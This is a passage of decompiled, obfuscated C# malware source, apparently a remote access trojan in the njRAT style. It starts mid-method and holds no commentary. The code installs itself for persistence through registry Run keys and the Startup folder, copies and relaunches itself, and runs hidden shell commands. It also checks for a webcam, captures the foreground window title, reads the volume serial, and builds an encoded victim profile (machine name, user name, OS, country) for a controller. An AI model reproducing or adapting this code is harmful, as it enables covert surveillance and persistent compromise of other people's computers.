      }
      try
      {
        this.F.Registry.LocalMachine.OpenSubKey(this.sf, true).DeleteValue(this.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1430) + this.LO.FullName + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1510), AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1516) + this.RG + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1522));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.F.Registry.CurrentUser.OpenSubKey(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1534), true).DeleteSubKey(this.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1554) + this.LO.FullName + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1608), AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      ProjectData.EndApp();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private bool CompDir(FileInfo F1, FileInfo F2)
    {
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
        return false;
      DirectoryInfo directoryInfo1 = F1.Directory;
      DirectoryInfo directoryInfo2 = F2.Directory;
      while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
      {
        directoryInfo1 = directoryInfo1.Parent;
        directoryInfo2 = directoryInfo2.Parent;
        if (directoryInfo1 == null & directoryInfo2 == null)
          return true;
        if (directoryInfo1 == null || directoryInfo2 == null)
          return false;
      }
      return false;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void INS()
    {
      try
      {
        this.F.Registry.SetValue(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1628), \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1784), (object) 0, RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (!this.CompDir(this.LO, new FileInfo(Interaction.Environ(this.DR).ToLower() + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1806) + this.EXE.ToLower())))
      {
        try
        {
          if (System.IO.File.Exists(Interaction.Environ(this.DR) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1812) + this.EXE))
            System.IO.File.Delete(Interaction.Environ(this.DR) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1818) + this.EXE);
          System.IO.File.Copy(this.LO.FullName, Interaction.Environ(this.DR) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1824) + this.EXE, true);
          Process.Start(Interaction.Environ(this.DR) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1830) + this.EXE);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.EndApp();
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        Interaction.Shell(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1836) + this.LO.FullName + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1910) + this.LO.Name + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1920), AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(1940) + this.WSH + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2014), AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.F.Registry.CurrentUser.OpenSubKey(this.sf, true).SetValue(this.RG, (object) (\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2062) + this.LO.FullName + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2068)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.F.Registry.LocalMachine.OpenSubKey(this.sf, true).SetValue(this.RG, (object) (\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2080) + this.LO.FullName + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2086)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.Copy(this.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2098) + this.RG + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2104), true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(1000);
    }

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool Cam()
    {
      try
      {
        string str1 = Strings.Space(100);
        int num = 0;
        do
        {
          int wDriver = (int) checked ((short) num);
          ref string local1 = ref str1;
          string str2 = (string) null;
          ref string local2 = ref str2;
          if (A.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
            return true;
          checked { ++num; }
        }
        while (num <= 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    [DllImport("kernel32.dll")]
    private static extern int GetLocaleInfo(
      uint Locale,
      uint LCType,
      [Out] StringBuilder lpLCData,
      int cchData);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string Gcc(uint lInfo)
    {
      StringBuilder lpLCData = new StringBuilder(256);
      int localeInfo = A.GetLocaleInfo(1024U, lInfo, lpLCData, lpLCData.Capacity);
      return localeInfo > 0 ? lpLCData.ToString().Substring(0, checked (localeInfo - 1)) : string.Empty;
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowTextLength(long hwnd);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string ACT()
    {
      string str1;
      try
      {
        IntPtr foregroundWindow = A.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
        {
          string s = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2116);
          str1 = this.ENB(ref s);
        }
        else
        {
          int windowTextLength = A.GetWindowTextLength((long) foregroundWindow);
          string str2 = Strings.StrDup(checked (windowTextLength + 1), \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2122));
          A.GetWindowText(foregroundWindow, ref str2, checked (windowTextLength + 1));
          int lpdwProcessID;
          A.GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
          if (lpdwProcessID == 0)
          {
            str1 = this.ENB(ref str2);
          }
          else
          {
            try
            {
              string mainWindowTitle = Process.GetProcessById(lpdwProcessID).MainWindowTitle;
              str1 = this.ENB(ref mainWindowTitle);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              str1 = this.ENB(ref str2);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        string s = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2128);
        str1 = this.ENB(ref s);
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string HWD()
    {
      string str1;
      try
      {
        string str2 = Interaction.Environ(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2134)) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2160);
        ref string local1 = ref str2;
        string str3 = (string) null;
        ref string local2 = ref str3;
        int Number;
        ref int local3 = ref Number;
        int num1 = 0;
        ref int local4 = ref num1;
        int num2 = 0;
        ref int local5 = ref num2;
        string str4 = (string) null;
        ref string local6 = ref str4;
        A.GetVolumeInformation(ref local1, ref local2, 0, ref local3, ref local4, ref local5, ref local6, 0);
        str1 = Conversion.Hex(Number);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2166);
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void DLV(string n)
    {
      try
      {
        this.F.Registry.CurrentUser.CreateSubKey(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2176) + this.RG).DeleteValue(n);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string GTV(string n)
    {
      string str;
      try
      {
        str = Conversions.ToString(this.F.Registry.CurrentUser.CreateSubKey(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2198) + this.RG).GetValue(n, (object) ""));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public object STV(string n, string t)
    {
      object obj;
      try
      {
        this.F.Registry.CurrentUser.CreateSubKey(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2220) + this.RG).SetValue(n, (object) t);
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string inf()
    {
      string str1 = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2242) + this.Y;
      string str2;
      try
      {
        if (Operators.CompareString(this.GTV(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2250)), "", false) == 0)
        {
          string str3 = str1;
          string s = this.DEB(ref this.VN) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2258) + this.HWD();
          string str4 = this.ENB(ref s);
          string y = this.Y;
          str2 = str3 + str4 + y;
        }
        else
        {
          string str5 = str1;
          string s1 = this.GTV(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2264));
          string s2 = this.DEB(ref s1) + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2272) + this.HWD();
          string str6 = this.ENB(ref s2);
          string y = this.Y;
          str2 = str5 + str6 + y;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        string str7 = str1;
        string s = this.HWD();
        string str8 = this.ENB(ref s);
        string y = this.Y;
        str2 = str7 + str8 + y;
        ProjectData.ClearProjectError();
      }
      string str9;
      try
      {
        str9 = str2 + Environment.MachineName + this.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str9 = str2 + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2278) + this.Y;
        ProjectData.ClearProjectError();
      }
      string str10;
      try
      {
        str10 = str9 + Environment.UserName + this.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str10 = str9 + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2286) + this.Y;
        ProjectData.ClearProjectError();
      }
      string str11 = str10 + this.FR() + this.Y;
      string str12;
      try
      {
        str12 = str11 + this.Gcc(7U) + this.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str12 = str11 + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2294) + this.Y;
        ProjectData.ClearProjectError();
      }
      string str13;
      try
      {
        str13 = str12 + this.F.Info.OSFullName.Replace(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2300), "").Replace(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2322), \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2340)).Replace(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2350), "").Replace(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2356), "").Replace(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2362), \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2370)).Replace(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2376), \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2388));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str13 = str12 + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2398);
        ProjectData.ClearProjectError();
      }
      string str14;
      try
      {
        str14 = str13 + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2406) + Environment.GetEnvironmentVariable(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2412)).ToLower().Replace(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2460), "").Replace(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2470), "") + this.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str14 = str13 + this.Y;
        ProjectData.ClearProjectError();
      }
      string str15 = (!this.Cam() ? str14 + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2486) + this.Y : str14 + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2476) + this.Y) + this.VR + this.Y + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2494) + this.Y + this.ACT() + this.Y;
      string str16 = "";
      try
      {
        string[] valueNames = this.F.Registry.CurrentUser.CreateSubKey(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2500) + this.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
        int index = 0;
        while (index < valueNames.Length)
        {
          string str17 = valueNames[index];
          if (str17.Length == 32)
            str16 = str16 + str17 + \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2522);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str15 + str16;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string FR()
    {
      string str;
      try
      {
        str = this.LO.LastWriteTime.ToString(\u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2528));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = \u0039Gm9Ll2ahtCEvld3rY.Ygi2Fh0hm(2552);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string ENB(ref string s) => Convert.ToBase64String(Encoding.UTF8.GetBytes(s));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string DEB(ref string s) => Encoding.UTF8.GetString(Convert.FromBase64String(s));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static object rn(int NumberOfChars)
    {
      if (NumberOfChars <= 1)
        return (object) "";
      string str = "";
      Random random = new Random();
      char[] chArray = new char[26]
      {
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'g',
        'h',
        'i',
        'j',
        'k',
        'l',
        'm',
        'n',
        'o',
        'p',
        'q',
        'r',
        's',
        't',
        'u',
        'v',
        'w',
        'x',
        'y',
        'z'
      };
      int num1 = NumberOfChars;
      int num2 = 0;
      while (num2 <= num1)
      {
        str += Conversions.ToString(chArray[random.Next(0, checked (chArray.Length - 1))]);
        checked { ++num2; }
      }
      return (object) str;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public byte[] SB(ref string S) => Encoding.Default.GetBytes(S);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string BS(ref byte[] B) => Encoding.Default.GetString(B);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Array fx(byte[] b, string spl)
    {
      List<byte[]> numArrayList = new List<byte[]>();
      MemoryStream memoryStream1 = new MemoryStream();
      MemoryStream memoryStream2 = new MemoryStream();
      string[] strArray = Strings.Split(this.BS(ref b), spl);
      memoryStream1.Write(b, 0, strArray[0].Length);
      memoryStream2.Write(b, checked (strArray[0].Length + spl.Length), checked (b.Length - strArray[0].Length + spl.Length));
      numArrayList.Add(memoryStream1.ToArray());
      numArrayList.Add(memoryStream2.ToArray());
      memoryStream1.Dispose();
      memoryStream2.Dispose();
      return (Array) numArrayList.ToArray();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public byte[] ZIP(byte[] B, ref bool CM)
    {
      if (CM)
      {
        MemoryStream memoryStream = new MemoryStream();
        GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Compress, true);
        gzipStream.Write(B, 0, B.Length);
        gzipStream.Dispose();
        memoryStream.Position = 0L;
        byte[] buffer = new byte[checked ((int) memoryStream.Length + 1)];
        memoryStream.Read(buffer, 0, buffer.Length);
        memoryStream.Dispose();
        return buffer;
      }
      MemoryStream memoryStream1 = new MemoryStream(B);
      GZipStream gzipStream1 = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress);
      byte[] buffer1 = new byte[4];
      memoryStream1.Position = checked (memoryStream1.Length - 5L);
      memoryStream1.Read(buffer1, 0, 4);
      int int32 = BitConverter.ToInt32(buffer1, 0);
      memoryStream1.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1)];
      gzipStream1.Read(array, 0, int32);
      gzipStream1.Dispose();
      memoryStream1.Dispose();
      return array;
    }
  }
}
